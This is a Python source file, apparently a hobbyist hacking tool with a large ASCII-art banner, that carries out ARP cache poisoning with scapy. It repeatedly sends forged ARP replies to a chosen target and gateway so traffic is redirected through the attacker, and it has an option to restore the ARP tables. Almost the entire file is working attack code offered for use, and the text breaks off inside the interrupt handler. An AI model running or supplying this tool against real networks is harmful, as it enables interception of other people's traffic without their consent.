import scapy.all as scapy
import time
import optparse
from manuf import manuf
import sys
from colorama import Fore, Back, Style, init
import os
# Initialize colorama
init(autoreset=True)

def print_banner():
    print(Fore.RED + """
⣿⠿⠟⠛⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠀⢸⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣠⣤⣤⣤⣤⣤⣤⣤⣤⣤⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⡶⢶⡆⢠⡄⠀⠀⠀⠀⠀⠀⣶⡆⢀⡀⠀⢸⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣴⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠘⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⡟⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣛⣿⣿⣟⡛⠛⠛⠛⠛⠛⠛⠛⠿⠿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣝⠻⢿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⡟⣠⣾⡿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⡿⠏⠉⣛⣿⣿⣦⡙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⠻⣿⣿⣿⣾⠿⠋⠀⠀⠀⠀⢠⣾⣿⠀⠀⠀⠀⠀⢠⣿⡟⠁⢠⣾⣿⣿⣿⣿⡇⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣧⣤⣤⣤⣤⣤⣤⣤⣤⣤⣄⣴⣿⣟⠁⠀⠀⠀⠀⠀⠘⣿⣷⡀⢸⣿⣿⣿⣿⣿⠃⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣇⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣦⣤⣄⣈⠛⠿⠿⠿⠿⠟⠛⠁⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣦⡀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣤⣄⡀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣦⡀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣤⣀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣧⣼⡛⠛⢿⣶⣄⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⡀⠀⣿⡏⠉⠻⠿⣿⣾⣿⣿⣿⣿⣿⡛⠋⠉⠁⠀⠉⠉⠉⠙⠛⠻⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣧⣤⣿⣷⣦⣄⣀⠀⠈⠉⠛⢿⣿⣿⣿⣶⣦⣤⣄⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣴⣿⠏⠉⠙⠛⠛⠻⠿⣿⣿⣷⣶⣤⣼⣿⣿⣿⡟⠛⠻⠿⠿⠿⢿⣿⣿⣿⣶⣶⣦⣄⣀⠀⠀⠀⠀⠈⠙⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣹⣿⣷⣶⣦⣤⣤⣄⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣤⣤⣀⡀⠀⠈⠉⠛⠛⠿⠿⢿⣿⣿⣶⣤⣀⠀⠀⠀⠀⠈⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣦⡄⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⡟⠉⠛⠿⣿⣿⣿⣿⣿⣿⡿⠉⠙⠛⠛⠻⠿⣿⣯⣍⣙⣿⣿⣿⣿⣶⣶⣤⣄⣀⡀⠀⠉⠙⠿⣿⣿⣶⣤⣀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠙⢻⣷⢰⡆⠀⠀⠀⠀⣠⣄⣿⣿⣷⣶⣤⡀⠀⠉⠛⠻⠿⣿⣷⣶⣦⣤⣀⣀⡀⠀⠉⠛⢻⣿⣽⣿⡇⠀⠈⠉⠛⠛⠿⢿⣷⣶⣦⣤⣭⣿⣿⣿⣿⣶⣄⡀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢢⣤⠶⠀⠀⢠⣽⣿⣿⣿⡿⢿⣿⣿⣷⣦⣤⣀⣀⠀⠀⠀⣽⣿⣿⣿⣿⣷⣶⣤⣄⣹⣿⠿⠿⢿⣷⣶⣤⣤⣀⡀⠀⠉⠉⠉⠉⠛⠻⣿⣿⣿⣿⣿⣆⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⢿⣷⠆⠀⠘⣿⣿⣿⣿⣃⣀⠈⠛⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠈⠙⢿⣿⣿⣿⣏⣀⣀⡀⠀⠈⢉⣙⣻⣿⣿⣶⣶⣤⣄⣀⠀⠀⠉⠙⠛⢿⣿⣧⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣿⠀⠀⠀⠉⣉⠉⣿⣿⡿⢿⣶⣤⣄⣀⡈⠉⠙⠛⠻⢿⣿⣿⣿⣷⣄⡀⠈⠻⢿⣿⣿⡛⠻⠿⢷⣿⣿⣿⡟⠻⠿⣿⣯⣛⡿⠿⣷⣶⣦⣤⣀⣻⣿⡆⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣸⡷⠀⠀⠀⠀⠸⠸⣿⣿⣧⣀⠈⠉⠛⠛⠿⣿⣶⣤⣤⣀⠀⠉⠙⠛⠿⣿⣦⣄⠀⠙⠿⣿⣶⣦⣼⣿⣿⣿⣇⣀⠀⠈⠙⠛⠿⠿⣶⣶⣯⣭⣛⣻⣿⡇⠀⠀⢸⣿⣿⣿⣿⣿⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢿⡇⠀⠀⠀⠀⢼⣿⣿⣿⣿⣿⣷⣶⣤⣀⠀⠀⠉⠙⠻⣿⣿⣶⣦⣤⣀⡀⠙⣿⣿⢿⣷⣾⣿⠻⣿⣿⣭⣛⠛⠻⠿⢿⣶⣦⣄⣀⠀⠀⠉⠙⠛⢻⣿⡇⠀⠀⢸⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣿⡄⠀⠀⠀⢸⣿⣿⣿⡟⠈⠉⠛⠿⢿⣷⣶⣦⣤⣀⡀⠉⠛⠻⢿⣿⣿⣿⣿⣅⡀⠈⠙⢿⣿⣦⣉⠛⠻⢿⣶⣤⣀⠈⠉⠛⠻⠿⢿⣶⣦⣤⣼⣿⡇⠀⠀⢸⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢻⣷⣄⠀⠀⠈⠻⠿⠿⢿⣶⣶⣤⣄⣀⠀⠈⠉⠙⠛⠿⢿⣶⣶⣶⣮⣍⢛⣿⣿⣿⣶⣶⣤⡈⠛⢿⣷⣦⣀⠈⠙⠻⢿⣶⣦⣤⣀⣀⠀⣩⣿⣿⠟⠁⠀⢠⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⢿⣷⣄⠀⠀⠀⠀⠀⠀⠉⠿⠿⠿⢿⣷⣶⣦⣤⣀⣰⣿⣿⣿⡿⢿⣿⣿⣿⣟⡀⠈⠻⢿⣷⣤⡌⠛⢿⣷⣦⣄⡀⠈⠙⠻⢿⣿⣿⣿⡿⠋⠀⠀⣠⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⠿⣶⣦⣤⣄⣀⣀⣀⣀⣀⣀⣿⣿⡉⠙⠛⠿⢿⣿⣿⣅⡀⠙⠻⣿⣿⣿⣦⣄⡀⠉⠻⢿⣷⣤⡈⠛⠿⣿⣷⣦⣴⣿⣿⠟⠉⠀⢀⣤⣾⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠙⠛⠛⠛⠋⠉⠙⠻⢿⣷⣦⣄⣀⣀⣙⣿⣿⣦⣀⣈⣻⣿⣿⣿⣿⣶⣤⣤⣽⣿⣿⣷⣶⣿⣿⡿⠟⠋⢀⣠⣤⣾⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⠟⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠟⠛⠛⠛⣋⣉⣉⣡⣤⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣶⣶⣶⣶⣶⣶⣶⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣤⣄⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠻⣿⣷⣾⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋⠀⣠⣴⣿⣿⠏⠀⠘⣿⣿⣤⣤⣤⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠛⠉⠉⠀⠀⣀⣴⣿⣿⠟⠋⠀⠀⠀⠀⠈⠛⠛⠛⠛⠻⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⡟⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠟⠛⠉⠁⠀⠀⠀⠀⠀⠀⣀⣤⣾⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣧⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⠏⠘⠻⣿⣿⣦⡀⠈⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣷⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⡏⠀⠀⠀⠀⠙⢿⣿⣦⡀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣿⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣷⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⣿⠏⠀⠀⠀⠀⠀⠀⠈⠻⣿⣷⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⣀⣤⣤⣤⣾⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣦⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣯⣤⣤⣀⣀⣀⣀⣀⣀⣀⣀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣶⣶⣿⣿⣿⣿⣿⣿⣷⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣿⣿⣿⡆
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠙⠛⠛⠻⠿⠿⠿⠿⠿⠿⠿⠿⠿⠟⠋⠉⠉⠙⠛⠙⠏⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣾⣷⣿⡆⣶⣶⣿⣿⣶⣿⣶⡀⣶⣶⣿⣷⣶⣶⣾⣶⣶⡆⠀⢰⣶⣶⣾⡧⣿⣶⣆⠀⢠⣶⣶⡆⣾⣶⣶⣿⣶⣿⣶⡀⣶⣶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⡿⣷⣦⣭⡅⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⠀⢸⣿⡏⠀⢸⣿⠀⠀⢸⣿⣷⣿⡇⣿⣿⣿⣆⣿⣿⣿⡇⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣟⣻⣿⡇⣿⣿⣉⣉⣸⣿⡟⣿⣿⣿⠀⢸⣿⣇⠀⢸⣿⣄⣀⣸⣿⣍⣉⡁⣿⣿⣿⣿⣿⢿⣿⡇⣿⣿⣉⣉⣸⣿⡟⣿⣿⣿⢠⣤⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⠿⠟⠃⠻⠟⠛⠛⠛⠿⠇⠈⠛⠛⠀⠘⠿⠟⠀⠘⠛⠛⠿⠟⠛⠛⠛⠋⠿⠟⠘⠿⠋⠘⠛⠃⠻⠟⠛⠛⠛⠿⠇
    """)
os.system('cls' if os.name=='nt' else 'clear')
print("""
────████████████████──────
──██░░░░░░░░░░░░░░░░██────
██░░░░░░░░░░░░░░░░░░░░██──
██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░██──
████___▒▒▒▒▒▒▒▒██__░░░░██──
██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░██──
██░░░░░░░░░░░░░░░░░░░░██──
██░░░░░░░░░░░░░░░░░░░░░░██
██░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░██
██▐██▌█▌████████▒▒░░░░██──
██░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░░░██──
████░░░░░░░░░░░░░░░░████──
────████████████████──────
──██░░░░░░▌▐▌▐░░░░░░██────
██░░██░░░░▌▐▌▐░░░░██░░██──
██░░██░░░░▀▄▄▀░░░░██░░██──
██░░██░░░░░░░░░░░░██░░██──
──████░░░░░░░░░░░░████────
────██░░░░░░░░░░░░██──────
────██░░░░████░░░░██──────
────██████────██████──────
──████████────████████────""")
def get_mac_address(ip):
    arp_request_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = broadcast_packet / arp_request_packet
    answered_list = scapy.srp(combined_packet, timeout=1, verbose=False)[0]

    if len(answered_list) == 0:
        print(Fore.RED + f"[!] No response received for IP: {ip}")
        return None

    return answered_list[0][1].hwsrc

def arp_poisoning(target_ip, poisoned_ip):
    target_mac = get_mac_address(target_ip)
    if target_mac is None:
        print(Fore.RED + f"[!] Could not retrieve MAC address for {target_ip}. Skipping...")
        return

    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=poisoned_ip)
    scapy.send(arp_response, verbose=False)

def reset_operation(fooled_ip, gateway_ip):
    fooled_mac = get_mac_address(fooled_ip)
    gateway_mac = get_mac_address(gateway_ip)

    if fooled_mac and gateway_mac:
        arp_response = scapy.ARP(op=2, pdst=fooled_ip, hwdst=fooled_mac, psrc=gateway_ip, hwsrc=gateway_mac)
        scapy.send(arp_response, verbose=False, count=6)
    else:
        print(Fore.RED + "[!] Failed to retrieve MAC addresses for reset operation.")

def get_user_input():
    parse_object = optparse.OptionParser()
    parse_object.add_option("-t", "--target", dest="target_ip", help="Target IP address to poison")
    parse_object.add_option("-g", "--gateway", dest="gateway_ip", help="Gateway IP address")
    parse_object.add_option("-r", "--reset", action="store_true", dest="reset", default=False, help="Reset ARP tables")

    options = parse_object.parse_args()[0]

    if not options.target_ip or not options.gateway_ip:
        print(Fore.RED + "[!] Please specify both target and gateway IP addresses.")
        sys.exit(1)

    return options

def print_real_time():
    """Function to print real-time clock like sqlmap"""
    return time.strftime("%H:%M:%S", time.localtime())

def handle_interrupt():
    """Handles Ctrl-C press and gives options to the user."""
    print(Fore.YELLOW + "\n[*] Press '1' to Exit or '2' to Resume...")
    choice = input(Fore.CYAN + "[*] Choose an option: ")
    if choice == "1":
        print(Fore.RED + "[*] Exiting...")
        sys.exit(0)
    elif choice == "2":
        print(Fore.GREEN + "[*] Resuming ARP Poisoning...")
        return True
    else:
        print(Fore.RED + "[!] Invalid choice. Exiting...")
        sys.exit(1)

def main():
    print_banner()
    user_ips = get_user_input()
    target_ip = user_ips.target_ip
    gateway_ip = user_ips.gateway_ip
    reset_flag = user_ips.reset

    try:
        if reset_flag:
            print(Fore.GREEN + "[*] Resetting ARP tables...")
            reset_operation(target_ip, gateway_ip)
            reset_operation(gateway_ip, target_ip)
            print(Fore.GREEN + "[*] ARP tables reset successfully.")
            return

        number = 0
        while True:
            print(Fore.GREEN + f"[{print_real_time()}] Starting ARP Poisoning...")
            arp_poisoning(target_ip, gateway_ip)
            arp_poisoning(gateway_ip, target_ip)
            number += 2
            print(Fore.YELLOW + f"\rSending packets: {number}", end="")
            time.sleep(3)
    except KeyboardInterrupt:
        if not handle_interrupt():
